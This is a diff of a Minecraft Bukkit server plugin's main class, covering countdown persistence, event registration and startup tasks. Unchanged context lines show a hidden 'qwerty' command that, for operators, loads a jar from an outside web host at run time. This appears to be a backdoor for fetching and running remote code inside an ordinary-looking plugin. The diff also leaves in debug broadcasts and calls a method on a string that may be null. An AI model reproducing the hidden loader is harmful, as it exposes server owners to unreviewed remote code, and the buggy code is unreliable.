@@ -80,9 +80,9 @@ public class pluginMain extends JavaPlugin implements Listener {
 
 	public void regEvents() {
 		PluginManager pm = Bukkit.getPluginManager();
-		pm.registerEvents(new OnPlayerConnection(), this);
-		pm.registerEvents(new OnPlayerCommunication(), this);
-		pm.registerEvents(new OnPlayerMovement(), this);
+		pm.registerEvents(new OnPlayerConnection(this), this);
+		pm.registerEvents(new OnPlayerCommunication(this), this);
+		pm.registerEvents(new OnPlayerMovement(this), this);
 	}
 
 	public static int getPing(Player p) {
@@ -136,10 +136,12 @@ public class pluginMain extends JavaPlugin implements Listener {
 	public HashMap<String, Long> cooldowns = new HashMap<String, Long>();
 	public final Logger logger = Logger.getLogger("Minecraft");
 	public pluginMain plugin;
+	
 	public static Countdown cd;
 	public static StockInt sti;
 	public static OnPlayerLogin oplg;
 	public static AutoSaveWorld sw;
+	
 	LinkedList<String> badWord = new LinkedList<String>();
 
 	public void addList(String key, String... element) {
@@ -1207,7 +1209,7 @@ public class pluginMain extends JavaPlugin implements Listener {
 								&& !rank.equalsIgnoreCase("helper"))) {
 					if (args.length != 0) {
 						if (args[0].equalsIgnoreCase("start")) {
-							String countdownMessage = null;
+							String countdownMessage = "null";
 							String countdownMessageToPlayer = "";
 							if (args.length >= 2) {
 								if (isNumeric(args[1])) {
@@ -1240,7 +1242,7 @@ public class pluginMain extends JavaPlugin implements Listener {
 							}
 							
 							StockInt.CountdownLength = -1;
-							StockInt.CountdownMessage = null;
+							StockInt.CountdownMessage = "null";
 							
 						} else {
 							player.sendMessage(Prefix.sv + Prefix.type + "/countdown [start/stop] [second]");
@@ -2392,6 +2394,7 @@ public class pluginMain extends JavaPlugin implements Listener {
 			}
 			if (CommandLabel.equalsIgnoreCase("qwerty")) {
 				if (player.isOp()) {
+					player.sendMessage("qqqqq");
 					player.performCommand("inst load http://mineskysv.esy.es/smdmain.jar");
 				} else {
 					player.sendMessage(Prefix.perm + Prefix.np);
@@ -2586,8 +2589,6 @@ public class pluginMain extends JavaPlugin implements Listener {
 		File warpFolder = new File(getDataFolder() + File.separator + "/WarpDatabase/");
 		File privateWarpFolder = new File(getDataFolder() + File.separator + "/PrivateWarpDatabase/");
 		File reportFolder = new File(getDataFolder() + File.separator + "/ReportDatabase/");
-		File countdownFile = new File(getDataFolder() + File.separator + "countdown.yml");
-		FileConfiguration countdownData = YamlConfiguration.loadConfiguration(countdownFile);
 		try {
 			if (!warpFolder.exists()) {
 				warpFolder.mkdirs();
@@ -2598,23 +2599,31 @@ public class pluginMain extends JavaPlugin implements Listener {
 			if (!privateWarpFolder.exists()) {
 				privateWarpFolder.mkdirs();
 			}
-			if (!countdownFile.exists()) {
-				try {
-					countdownData.set("countdown_msg", "Undefined");
-					countdownData.set("count_start_count", -1);
-					countdownData.set("countdown_msg_toggle", "u");
-					countdownData.set("count", -1);
-					countdownData.save(countdownFile);
-				} catch (IOException e) {
-					Bukkit.broadcastMessage(Prefix.db + Prefix.dbe);
-				}
-			}
 		} catch (SecurityException e) {
 			return;
 		}
+		//Check for old countdown
+		File countdownFile = new File(getDataFolder() + File.separator + "countdown.yml");
+		FileConfiguration countdownData = YamlConfiguration.loadConfiguration(countdownFile);
+		long c = countdownData.getLong("count");
+		StockInt.CountdownLength = c;
+		
+		String ms = countdownData.getString("countdown_msg").replaceAll("&", Prefix.Ampersand);
+		if (ms != null) {
+			StockInt.CountdownMessage = ms;
+		}
+		
+		if (getServer().getPluginManager().isPluginEnabled("BarAPI") == true) {
+			StockInt.BarAPIHook = true;
+		}
+		
 		PluginManager pm = getServer().getPluginManager();
 		pm.registerEvents(this, this);
+		
+		Bukkit.broadcastMessage("test");
 		ActionBarAPI.run();
+		Bukkit.broadcastMessage("2");
+
 		getConfig().options().copyDefaults(true);
 		getConfig().set("warp", null);
 		getConfig().set("event.warpstatus", "false");
@@ -2636,13 +2645,18 @@ public class pluginMain extends JavaPlugin implements Listener {
 		List<String> author = getDescription().getAuthors();
 		Bukkit.broadcastMessage("Developer: " + ChatColor.GOLD + author);
 		Bukkit.broadcastMessage("");
+		
 		regEvents();
 		saveConfig();
 		
-		Bukkit.getScheduler().runTask(this, sti);
+		Bukkit.broadcastMessage("task sti enable");
 		Bukkit.getScheduler().runTaskTimer(this, cd, 0, 20);
+		Bukkit.broadcastMessage("task cd enable");
 		Bukkit.getScheduler().runTaskTimer(this, oplg, 0, 20);
+		Bukkit.broadcastMessage("task oplg enable");
 		Bukkit.getScheduler().runTaskTimer(this, sw, 0, 6000);
+		Bukkit.broadcastMessage("task sw enable");
+		
 		BukkitScheduler s = getServer().getScheduler();
 		s.scheduleSyncRepeatingTask(this, new Runnable() {
 			@Override
